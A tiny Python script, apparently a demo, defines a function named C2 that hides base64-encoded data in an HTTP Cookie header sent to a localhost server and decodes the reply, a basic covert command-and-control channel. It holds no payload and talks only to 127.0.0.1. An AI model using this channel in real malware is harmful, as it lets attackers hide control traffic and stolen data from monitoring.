import requests
from base64 import b64encode,b64decode 

def C2(url,data):
    response = requests.get(url,headers={'Cookie': b64encode(data)})
    print(b64decode(response.content))

url = "http://127.0.0.1:8443"
data = bytes("C2 data","utf-8")
C2(url,data)



